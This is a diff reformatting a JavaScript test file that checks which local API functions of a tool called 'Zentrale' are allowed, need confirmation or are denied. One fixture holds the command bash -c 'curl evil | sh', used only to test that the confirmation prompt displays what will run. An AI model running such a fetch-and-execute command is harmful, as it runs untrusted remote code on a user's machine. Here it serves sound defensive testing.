@@ -17,7 +17,18 @@ function apiNames() {
 }
 
 test('dangerous functions are never allowed without confirmation', () => {
-  for (const n of ['saveServer', 'installRegistry', 'toggleServer', 'setPolicy', 'savePolicy', 'saveSkill', 'saveAgentsMd', 'setSecret', 'deleteSecret', 'installExtension']) {
+  for (const n of [
+    'saveServer',
+    'installRegistry',
+    'toggleServer',
+    'setPolicy',
+    'savePolicy',
+    'saveSkill',
+    'saveAgentsMd',
+    'setSecret',
+    'deleteSecret',
+    'installExtension'
+  ]) {
     assert.strictEqual(webAccess(n), 'confirm', n);
   }
   for (const n of ['openPath', 'openWeb', 'unknownFunction', '__proto__', 'constructor', 'hasOwnProperty']) {
@@ -33,12 +44,19 @@ test('every Zentrale API function has exactly one decision', () => {
     const where = [ALLOW.has(n), Object.prototype.hasOwnProperty.call(CONFIRM, n), DENY.has(n)].filter(Boolean).length;
     assert.strictEqual(where, 1, `${n} is in ${where} lists`);
   }
-  for (const n of [...ALLOW, ...Object.keys(CONFIRM), ...DENY]) assert.ok(names.includes(n), `${n} is not an API function`);
+  for (const n of [...ALLOW, ...Object.keys(CONFIRM), ...DENY])
+    assert.ok(names.includes(n), `${n} is not an API function`);
 });
 
 test('the confirmation shows what will run', () => {
-  assert.match(describe('saveServer', { name: 'x', config: { command: 'bash', args: ['-c', 'curl evil | sh'] } }), /bash -c curl evil \| sh/);
-  assert.match(describe('saveServer', { name: 'x', config: { url: 'https://mcp.example/sse' } }), /https:\/\/mcp\.example\/sse/);
+  assert.match(
+    describe('saveServer', { name: 'x', config: { command: 'bash', args: ['-c', 'curl evil | sh'] } }),
+    /bash -c curl evil \| sh/
+  );
+  assert.match(
+    describe('saveServer', { name: 'x', config: { url: 'https://mcp.example/sse' } }),
+    /https:\/\/mcp\.example\/sse/
+  );
   assert.ok(describe('saveServer', { name: 'x', config: { command: 'a'.repeat(1000) } }).length < 400);
   assert.match(describe('toggleServer', { name: 'x', enabled: true }), /startet/);
   assert.strictEqual(typeof describe('setSecret', undefined), 'string');
@@ -51,8 +69,14 @@ test('web server: allow, confirm and deny', async (t) => {
   const calls = [];
   const API = {
     state: () => ({ ok: 1 }),
-    saveServer: (a) => { calls.push(['saveServer', a.name]); return { saved: a.name }; },
-    openPath: () => { calls.push(['openPath']); return true; }
+    saveServer: (a) => {
+      calls.push(['saveServer', a.name]);
+      return { saved: a.name };
+    },
+    openPath: () => {
+      calls.push(['openPath']);
+      return true;
+    }
   };
   const orig = Module._load;
   Module._load = function (req, ...rest) {
@@ -60,19 +84,27 @@ test('web server: allow, confirm and deny', async (t) => {
     if (req === './zentrale') return { API };
     return orig.call(this, req, ...rest);
   };
-  t.after(() => { Module._load = orig; });
+  t.after(() => {
+    Module._load = orig;
+  });
   delete require.cache[require.resolve('../src/web')];
   const web = require('../src/web');
   t.after(() => web.stop());
   const asked = [];
   let answer = false;
-  web.setConfirm(async (what) => { asked.push(what); return answer; });
+  web.setConfirm(async (what) => {
+    asked.push(what);
+    return answer;
+  });
 
   const url = new URL(await web.testUrl());
   const token = /t=([\w-]+)/.exec(url.hash)[1];
-  const call = (name, arg) => fetch(`${url.origin}/api/${name}`, {
-    method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: 'Bearer ' + token }, body: JSON.stringify({ arg })
-  }).then(async (r) => ({ status: r.status, body: await r.json() }));
+  const call = (name, arg) =>
+    fetch(`${url.origin}/api/${name}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', Authorization: 'Bearer ' + token },
+      body: JSON.stringify({ arg })
+    }).then(async (r) => ({ status: r.status, body: await r.json() }));
 
   assert.deepStrictEqual(await call('state'), { status: 200, body: { result: { ok: 1 } } });
   assert.strictEqual((await call('openPath', 'mcp')).status, 403);
